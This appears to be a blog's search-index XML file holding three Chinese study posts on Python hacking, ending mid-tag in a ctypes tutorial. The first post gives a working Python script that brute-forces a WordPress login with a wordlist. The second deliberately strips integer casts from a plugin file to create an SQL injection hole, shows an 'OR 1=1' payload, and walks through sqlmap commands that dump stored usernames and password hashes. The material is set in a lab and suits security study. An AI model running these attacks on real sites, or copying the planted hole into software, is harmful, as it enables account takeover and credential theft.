<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Web攻击--密码破解攻击</title>
      <link href="2021/03/21/web-gong-ji-mi-ma-po-jie-gong-ji/"/>
      <url>2021/03/21/web-gong-ji-mi-ma-po-jie-gong-ji/</url>
      
        <content type="html"><![CDATA[<ul><li>与PHP/JSP类似，Python也可以访问Web页面<ul><li>借助urllib与urllib2模块可以实现对Web页面的访问。urllib中，使用key1=value1&amp;key2=value2的方式创建POST消息，就像HTTP协议一样。在urlllib2中创建Request对象，访问Web服务器，返回Response对象<br><img src="https://www.hualigs.cn/image/605709bfdbab9.jpg" alt=""></li></ul></li></ul><h2 id="一、URLLIB与URLLIB2"><a href="#一、URLLIB与URLLIB2" class="headerlink" title="一、URLLIB与URLLIB2"></a>一、URLLIB与URLLIB2</h2><ul><li><p>不可相互替代，搭配使用，urllib2是urllib的增强，但是urllib中有urllib2中所没有的函数</p></li><li><p>urllib仅可接受URL，urllib2.openurl可接受Request参数，从而控制HTTP Request的header部分。如果访问网站，想更改User Agent（伪装浏览器），就要用urllib2</p></li><li><p>urllib支持设置编码函数，urllib.urlencode。在模拟登录的时候，经常要post编码之后的参数</p></li><li><p>1.Request对象：使用urllib模块，创建HTTP协议的头部与体部。使用GET方法传送时，无需单独创建Request对象，只要创建URL使用HTTP传送模块即可。而使用POST方法传送，或需要修改请求头的值或传递Cookie时，必须创建Request对象进行传递</p></li><li><p>2.HTTP传送：使用urllib2提供的函数，直接访问指定URL，无需额外为套接字通信做其它工作。以参数值的形式传递URL，若需要，可以一起传递Request对象。该函数支持浏览器提供的大部分通信功能</p></li><li><p>3.服务器：URL指向Apache Web服务，Apache Web服务器分析HTTP头部与体部，访问指定服务，然后将结果创建为HTTP协议的形式，传送给黑客PC</p></li><li><p>4.Response对象：响应依据HTTP协议格式返回，并以Response对象形式返回，这样才能在应用程序中使用</p></li><li><p>5.黑客PC：通过Response对象提供的函数，可以访问返回的URL、HTTP状态码、头信息及数据</p></li></ul><p>进行黑客攻击通常需要做大量重复性工作。如果直接通过浏览器攻击Web网站，就要不断手动修改输入值，并反复点击。但如果可以在应用程序内部访问Web网站并接收结果值，那么只需要使用简单的几行python代码即可攻破目标网站</p><p><strong>例：</strong></p><p>此外，Python提供的urllib与urllib2模块还有其它功能。与cookielib一起使用可以将Cookie值传递给Web服务器，维持会话。这样就可以连接需要登录的网站，下载文件或者上传XSS攻击所需的各种文件</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token keyword">import</span> urllib2url<span class="token operator">=</span><span class="token string">"http://server/wordpress/wp-login.php"</span><span class="token triple-quoted-string string">'''URL指出WordPress的登录页面，相应输入值放入用户名与密码'''</span>values<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'log'</span><span class="token punctuation">:</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'pwd'</span><span class="token punctuation">:</span><span class="token string">'python1'</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#设置POST传送值：以列表形式传送</span><span class="token triple-quoted-string string">'''设置头部：可以随意设置HTTP头部'''</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agentent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/4.0'</span><span class="token punctuation">}</span><span class="token triple-quoted-string string">'''对POST值编码：将值设置为HTTP协议所用形式'''</span>data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''创建Request对象：创建Request对象时，若只简单调用URL，则放入URL参数即可'''</span>request<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''调用Web网页：连接通信会话，调用Web页面，使用Request对象'''</span>response<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#URL: %s"</span> <span class="token operator">%</span>response<span class="token punctuation">.</span>gerurl<span class="token punctuation">(</span><span class="token punctuation">)</span>    #输出<span class="token keyword">print</span> <span class="token string">"#CODE: %s"</span> <span class="token operator">%</span>response<span class="token punctuation">.</span>getcode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#INFO: %s"</span> <span class="token operator">%</span>response<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#DATA: %s"</span> <span class="token operator">%</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：<br><img src="https://www.hualigs.cn/image/605709bfc83b7.jpg" alt=""></p><h2 id="二、Web密码破解攻击"><a href="#二、Web密码破解攻击" class="headerlink" title="二、Web密码破解攻击"></a>二、Web密码破解攻击</h2><ul><li>假设Web应用不在登录程序中检查密码错误的次数，则可在程序中访问Web页面，借助循环不断尝试输入不同词典密码(sqlmap模块提供的wordlist)</li><li>为简化示例逻辑，假设已知用户ID，或使用谷歌搜索多种形式的用户ID形成ID词典</li><li>要自动提交用户名与密码，需事先知道它们保存于哪些变量，需要具备HTML、JavaScript基础</li><li>分析登录页面HTML源码，<form>标记的action字段用于指定接收用户输入的页面。<input>标记的name字段用于设置保存用户输入值的变量名</form></li><li>在网站输入密码时，若密码输错次数超过指定次数，系统通常会暂时锁定用户，或者停用账号，借此防御外部攻击。通过Web防火墙等安全设备可以轻松阻止此类攻击，但依然有很多网站安全意识薄弱，运行的系统含有多种漏洞，甚至连密码破解这种初级攻击方式也无法抵御</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token keyword">import</span> urllib2url<span class="token operator">=</span><span class="token string">"http://server/wordpress/wp-login.php"</span>user_login<span class="token operator">=</span><span class="token string">"python"</span>    <span class="token comment" spellcheck="true">#出于便利，假设已知用户名</span>wordlist<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'wordlist.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#攻击词典</span>passwords<span class="token operator">=</span>wordlist<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> password <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#循环，不断测试与指定ID密码是否匹配</span>    password<span class="token operator">=</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    values<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'log'</span><span class="token punctuation">:</span>user_login<span class="token punctuation">,</span><span class="token string">'pwd'</span><span class="token punctuation">:</span>password<span class="token punctuation">}</span>    data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>    request<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>    response<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#登录检测：若正常登录，则进入管理员页面</span>        idx<span class="token operator">=</span>response<span class="token punctuation">.</span>geturl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'wp-admin'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        idx<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>idx<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#检测密码成功</span>        <span class="token keyword">print</span> <span class="token string">"######success!###### [="</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"]"</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"######failed!###### ["</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"]"</span>wordlist<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/21/2021 5:00:01 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web攻击--SQL注入</title>
      <link href="2021/03/19/web-gong-ji-sql-zhu-ru/"/>
      <url>2021/03/19/web-gong-ji-sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Web服务模式"><a href="#一、Web服务模式" class="headerlink" title="一、Web服务模式"></a>一、Web服务模式</h2><p><img src="https://www.hualigs.cn/image/60549af556d79.jpg" alt=""></p><h2 id="二、搭建测试环境"><a href="#二、搭建测试环境" class="headerlink" title="二、搭建测试环境"></a>二、搭建测试环境</h2><p><img src="https://www.hualigs.cn/image/60549af56f676.jpg" alt=""></p><ul><li>服务器PC中搭建用于黑客攻击的Web网站</li><li>为了测试方便，AMP、Wordpress均使用默认设置，数据库名称为wordpress，所有账号/密码全部设为python</li><li>黑客PC中开发用于入侵Web网站的Python程序</li><li>客户机PC执行普通用户的正常操作</li><li>修改虚拟PC网络设置（NAT/内网、windows防火墙、host文件）</li></ul><p>WordPress使用了安全编码，不容易进行攻击</p><ul><li>为了成功进行攻击，可安装安全性相对较差的插件（视频相关插件），下载插件后解压缩，将其放入服务器目录</li><li>打开提供环境访问功能的程序文件C:\APM_Setup\htdocs\wordpress\wpcontent\plugins\all-wideo-gallery\config.php，修改代码</li></ul><pre class=" language-python"><code class="language-python"><span class="token operator">/</span><span class="token operator">*</span>$_vid<span class="token operator">=</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'vid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token comment" spellcheck="true">#[原始代码]处理为注释</span><span class="token operator">/</span><span class="token operator">*</span>$_pid<span class="token operator">=</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'pid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token comment" spellcheck="true">#[原始代码]处理为注释</span>$_vid<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'vid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#[新代码]删除（int）</span>$_pid<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'pid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#[新代码]删除（int）</span></code></pre><h2 id="三、SQL注入"><a href="#三、SQL注入" class="headerlink" title="三、SQL注入"></a>三、SQL注入</h2><ul><li>利用应用程序的安全漏洞</li><li>SQL注入攻击主要向（接收并处理用户输入）变量值插入攻击代码以发动攻击</li></ul><pre class=" language-python"><code class="language-python"><span class="token operator">//</span>常用的用户认证代码$query<span class="token operator">=</span><span class="token string">"SELECT * FROM USER WHERE ID=$id and PWD=$pwd"</span>$result<span class="token operator">=</span>MySQL<span class="token punctuation">:</span>query<span class="token punctuation">(</span>$query<span class="token punctuation">,</span>$connect<span class="token punctuation">)</span></code></pre><ul><li>向网页上的id栏输入如下值：”1 OR 1=1–”</li><li>提交后组成如下SQL语句</li></ul><pre class=" language-python"><code class="language-python"><span class="token string">"SELECT * FROM USER WHERE ID=1 OR 1=1 -- and PWD=$pwd"</span>    <span class="token operator">//</span><span class="token operator">-</span><span class="token operator">-</span>后变为SQL注释</code></pre><ul><li>要成功进行SQL注入，必须不断更改输入值，找出系统漏洞。这是简单的重复工作，所以可以通过编写程序实现自动化</li><li>Python提供了实现这种自动化的多种模块，其中最具代表性的是sqlmap(sqlmap.org)</li><li>下载解压zip文件后，放入C:\Python\sqlmap目录，运行目录下的sqlmap.py文件即可安装</li><li>使用sqlmap进行黑客攻击的流程</li><li>将Web网站视为“黑盒”，从最简单的信息开始，一点点找出所需信息。发动SQL注入攻击一般经过如下5个步骤：<ul><li>1.搜索URL：SQL注入攻击基于URL，主要攻击目标是GET方法，将用户的输入值添加到URL并进行传送。可以很容易搜到攻击目标URL，攻击特定网站时，要尝试打开多个页面，观察URL的变化。此时，需要具备HTML与JavaScript相关知识</li><li>2.寻找漏洞：使用sqlmap.py程序，可以寻找所选URL的漏洞。由于大部分应用程序都含有防御SQL注入攻击的代码，所以需要使用Web爬虫等自动化工具，找出含有漏洞的URL。Web爬虫程序能够从指定网站下载多个页面，并且分析HTML代码，找出有可能被攻击的URL</li><li>3.搜索数据库：找到目标URL的漏洞后，搜索数据库中有哪些数据表。分析表名就能知道哪些表含有重要信息</li><li>4.搜索列：搜索所选表中的列。由于列名能够反映数据特征，所以能够轻松找出包含重要信息的列</li><li>5.访问数据：访问所选列包含的数据。若数据处于加密状态，sqlmap将使用字典攻击技术对数据解密</li></ul></li></ul><h2 id="四、实例"><a href="#四、实例" class="headerlink" title="四、实例"></a>四、实例</h2><ul><li>此处省略对URL进行搜索的过程，直接尝试对config.php（用于提供WordPress插件的环境信息）发动SQL注入攻击</li><li>转到C:\Python\sqlmap目录，输入命令</li></ul><pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL</code></pre><p>sqlmap支持多种选项，上述命令中用到的几个选项中，-u选项表示后面出现的是URL，–level选项表示要执行的测试级别，–risk选项用于设置待执行测试的风险等级，–dbms选项指定要使用的数据库类型（若不指定，则对sqlmap支持的所有类型的数据库探测漏洞）</p><ul><li><p>–level选项，测试级别</p><ul><li>0：仅输出Python反向追踪(traceback)信息、错误及重要信息(Critical Message)</li><li>1：显示信息与警告信息，该值为默认值</li><li>2：同时显示所有调试信息</li><li>3：同时显示插入的有效载荷信息</li><li>4：同时显示HTTP请求信息</li><li>5：同时显示HTTP响应头信息</li><li>6：同时显示HTTP响应页面内容信息</li></ul></li><li><p>–risk选项，用于设置待执行测试的风险，表示攻击所用SQL代码的危险程度，风险等级越高，表示相关网站出现问题的可能性越高</p><ul><li>1：注入无问题代码，执行测试，默认值（Normal Injection（使用union）、Blind Injection（使用true：1=1，false：1=2））</li><li>2：执行Time-based Injection using heavy query。进行Blind Injection时，若不论真假都有相同结果值，则经过指定的待机时间后，通过测定时间判断插入的查询是否得以执行</li><li>3：使用OR-based Injection。若被攻击的目标程序执行update语句，则插入的or语句就会导致致命问题</li></ul></li><li><p>探测漏洞结果<br><img src="https://www.hualigs.cn/image/60549af5bb2dd.jpg" alt=""></p></li></ul><p>由探测结果可知，vid与pid存在漏洞。通过改变两个变量的输入值，可以进一步获取更多信息</p><ul><li>利用找到的漏洞，继续搜索数据库中有哪些表</li></ul><pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span><span class="token operator">-</span>tables</code></pre><p>–tables选项用于获取数据表列表。使用–table选项可以读取数据库中所有表的信息，然后找出含有用户信息的数据表</p><ul><li>数据表搜索结果<br><img src="https://www.hualigs.cn/image/60549af589a23.jpg" alt=""></li></ul><p>观察数据表列表可以发现，wp_users最有可能保存用户数据</p><ul><li>继续从wp_users数据表中提取所有数据列</li></ul><pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span>T wp_users <span class="token operator">-</span><span class="token operator">-</span>columns</code></pre><p>-T选项用于指定数据表<br>–columns选项用于从指定数据表提取所有数据列</p><ul><li>数据列搜索结果<br><img src="https://www.hualigs.cn/image/60549af4e7955.jpg" alt=""></li></ul><p>从搜索的数据列看，数据列user_login与user_pass分别保存用户ID与密码。只要得到用户名与密码，对网站的攻击就成功了。</p><ul><li>最后一步：从user_login与user_pass字段提取用户登录信息</li></ul><pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span>T wp_users <span class="token operator">-</span><span class="token operator">-</span>columns <span class="token operator">-</span>C user_login<span class="token punctuation">,</span> user_pass <span class="token operator">-</span><span class="token operator">-</span>dump</code></pre><p>-C选项 用于指定要进行攻击的数据列，指定多个数据列时用逗号隔开</p><p>–dump选项 用于从指定数据列提取所有数据</p><ul><li>数据提取结果<br><img src="https://www.hualigs.cn/image/60549af5247a2.jpg" alt=""></li></ul><p>数据提取过程中会遇到两个问题，一个为是否保存散列数据、另一个为是否对散列数据进行解密，全部选择y，使用sqlmap提供的解码工具可以对密码进行解密<br>3/19/2021 8:47:52 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>应用程序攻击</title>
      <link href="2021/03/18/ying-yong-cheng-xu-gong-ji/"/>
      <url>2021/03/18/ying-yong-cheng-xu-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Windows应用程序的基本概念"><a href="#一、Windows应用程序的基本概念" class="headerlink" title="一、Windows应用程序的基本概念"></a>一、Windows应用程序的基本概念</h2><ul><li>对Windows应用程序进行黑客攻击，必须拥有Windows API基础知识</li><li>开发Windows应用程序时，往往要使用各种lib与DLL库</li><li>lib是静态库，生成Windows可执行文件（exe文件）时，它们被包含到程序</li><li>DLL是动态链接库，应用程序运行时，才会加载调用相应的DLL库。Win32API大部分以DLL库形式存在<br><img src="https://www.hualigs.cn/image/60534b2984c14.jpg" alt=""></li></ul><p>Win32 API提供了多种用于控制低级操作系统功能的接口，所以不仅用于开发一般程序，还广泛应用于程序调试与黑客攻击程序的开发</p><h2 id="二、在Python中使用Win32-API"><a href="#二、在Python中使用Win32-API" class="headerlink" title="二、在Python中使用Win32 API"></a>二、在Python中使用Win32 API</h2><ul><li>Python默认提供ctypes模块（ctypes在Python2和Python3中有所不同），通过它可以在Python代码中调用DLL，使用C/C++的变量类型（想实现更高级的黑客攻击技术，必须理解掌握ctypes）</li><li>ctypes可以在Windows、Linux、UNIX、OS X、Android等多种平台中使用</li><li>ctypes适合于“中轻量级”的Python、C/C++混合编程</li></ul><h2 id="三、ctypes模块的基本概念"><a href="#三、ctypes模块的基本概念" class="headerlink" title="三、ctypes模块的基本概念"></a>三、ctypes模块的基本概念</h2><ul><li><p>ctypes简化了动态库的调用过程，支持复杂的C数据类型，提供低级函数。使用ctypes模块时，只要遵守函数调用约定，即可直接调用操作系统提供的API<br><img src="https://www.hualigs.cn/image/60534b297553e.jpg" alt=""></p></li><li><p>由于本地库与Python的函数调用方式、数据类型等彼此不同，所以要熟悉基本的ctypes语法，准确实现二者间的映射</p></li><li><p>ctypes支持多种调用约定（Calling Convention）</p><ul><li>cdll=cdecl</li><li>windll=stdcll</li><li>oledll=stdcall（其返回值假定为HRESULT）</li></ul></li><li><p>cdecl是C/C++的默认调用约定</p><ul><li>参数从右至左传递（入栈），由调用者（caller）清理栈区</li></ul></li><li><p>stdcall是Windows API默认调用约定</p><ul><li>微软的WINAPI、CALLBACK等宏都是该调用约定</li><li>参数从右至左传递（入栈），被调用者（callee）清理栈区</li></ul></li><li><p>fastcall</p><ul><li>参数从右至左传递（入栈），前2/4个参数被分别放进了ecx、edx（、r8、r9）寄存器，被调用者（callee）清理栈区</li><li>Win64统一为类似fastcall的调用约定</li></ul></li></ul><h2 id="四、ctype基本用法"><a href="#四、ctype基本用法" class="headerlink" title="四、ctype基本用法"></a>四、ctype基本用法</h2><h3 id="1-加载DLL和获取函数"><a href="#1-加载DLL和获取函数" class="headerlink" title="1.加载DLL和获取函数"></a>1.加载DLL和获取函数</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> platform<span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">if</span> platform<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'Windows'</span><span class="token punctuation">:</span>    libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#系统C标准库动态链接文件</span>    dll<span class="token operator">=</span>windll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span>dllpath<span class="token punctuation">)</span><span class="token keyword">elif</span> platform<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'Linux'</span><span class="token punctuation">:</span>    libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span></code></pre><ul><li>使用哪一行代码取决于导出函数的调用规范（cdecl或stdcall）</li><li>也可以使用下面两行代码代替：</li></ul><pre class=" language-python"><code class="language-python">libc<span class="token operator">=</span>CDLL<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#注意和上面大小写的区别</span>dll<span class="token operator">=</span>WinDll<span class="token punctuation">(</span>dllpath<span class="token punctuation">)</span></code></pre><ul><li>加载dll后，可得到dll中的导出函数</li></ul><pre class=" language-python"><code class="language-python">func<span class="token operator">=</span>dll<span class="token punctuation">.</span>func_name    <span class="token comment" spellcheck="true">#func_name是dll的导出函数</span></code></pre><ul><li>有些Windows动态链接库导出函数不是用名字，而是用序号（ordinal），这时需通过索引获取</li></ul><pre class=" language-python"><code class="language-python">func<span class="token operator">=</span>cdll<span class="token punctuation">.</span>kernel32<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><ul><li>得到函数后，要进行正确的函数调用，需设置好参数和返回值类型</li></ul><h3 id="2-ctypes数据类型与C和Python对应关系"><a href="#2-ctypes数据类型与C和Python对应关系" class="headerlink" title="2.ctypes数据类型与C和Python对应关系"></a>2.ctypes数据类型与C和Python对应关系</h3><p><img src="https://www.hualigs.cn/image/60534b296c079.jpg" alt=""></p><ul><li>Python中的类型，除了None，int，long，Byte String，Unicode String作为C函数的参数默认提供转换外，其它类型都必须显式提供转换<ul><li>None：对应C中的NULL</li><li>int，long：对应C中的int，具体实现时会根据机器字长自动适配/截断</li><li>Byte String：对应C中的一个字符串指针char*，指向一块内存区域</li><li>Unicode String：对应C中一个宽字符串指针wchar_t*，指向一块内存区域</li></ul></li></ul><h3 id="3-函数参数和返回值"><a href="#3-函数参数和返回值" class="headerlink" title="3.函数参数和返回值"></a>3.函数参数和返回值</h3><ul><li>设置函数的参数类型使用函数的argtypes属性，直接赋值为一个ctypes类型的列表或元组</li><li>设置函数的返回值类型使用函数的restype属性</li></ul><pre class=" language-python"><code class="language-python">func<span class="token punctuation">.</span>argtypes<span class="token operator">=</span><span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_void_p<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置函数参数类型为int,int,int,void*</span>func<span class="token punctuation">.</span>restype<span class="token operator">=</span>c_float    <span class="token comment" spellcheck="true">#设置返回值类型为float</span></code></pre><ul><li>python中，默认函数返回值为c_int型，可以不用显式设置函数的restype属性，若参数类型不是c_int型则需要设置</li><li>除了整数、字节串和字符串以外Python类型的参数传递，必须使用ctypes类型做包装</li></ul><h3 id="4-结构体"><a href="#4-结构体" class="headerlink" title="4.结构体"></a>4.结构体</h3><ul><li>自定义的结构体和联合体必须继承自ctypes的Structure和Union这两个类</li><li>每一个子类必须定义_fields_属性，是一个二维的tuples列表，描述类的一个数据成员的字段名和类型</li><li>字段类型必须是一个ctypes类型，如c_int，或者任何其他的继承ctypes的类型，如Structure，Union，Array，指针等</li><li>例如一个简单结构，包含两个整型x和y</li><li>也可创建复杂结构体 </li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> types<span class="token keyword">class</span> <span class="token class-name">Point</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">]</span>p1<span class="token operator">=</span>Point<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>point<span class="token punctuation">.</span>x<span class="token punctuation">,</span>point<span class="token punctuation">.</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出1 2</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">RECT</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"upperleft"</span><span class="token punctuation">,</span>POINT<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"lowerright"</span><span class="token punctuation">,</span>POINT<span class="token punctuation">)</span><span class="token punctuation">]</span>rc<span class="token operator">=</span>RECT<span class="token punctuation">(</span>POINT<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>POINT<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rc<span class="token punctuation">.</span>upperleft<span class="token punctuation">.</span>x<span class="token punctuation">,</span>rc<span class="token punctuation">.</span>upperleft<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rc<span class="token punctuation">.</span>lowerright<span class="token punctuation">.</span>x<span class="token punctuation">,</span>rc<span class="token punctuation">.</span>lowerright<span class="token punctuation">.</span>y<span class="token punctuation">)</span></code></pre><h3 id="5-数组"><a href="#5-数组" class="headerlink" title="5.数组"></a>5.数组</h3><ul><li>数组就是序列，包含固定数量的相同类型的实例。推荐的创建数组类型的方式是使用*和整数应用到类型</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">POINT</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">]</span>TenPointsArrayType<span class="token operator">=</span>Point<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#创建一个数组类型，由10个Point组成的数组</span>arr<span class="token operator">=</span>TenPointsArrayType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建一个数组类的对象</span>type_int_array_10<span class="token operator">=</span>c_int<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#先定义一个数组类型</span>type_int_array_10_10<span class="token operator">=</span>type_int_array_10<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#定义二维数组</span>my_array<span class="token operator">=</span>type_int_array_10_10<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建二维数组对象</span>my_array<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span>    <span class="token comment" spellcheck="true">#使用二维数组</span></code></pre><h3 id="6-指针和引用"><a href="#6-指针和引用" class="headerlink" 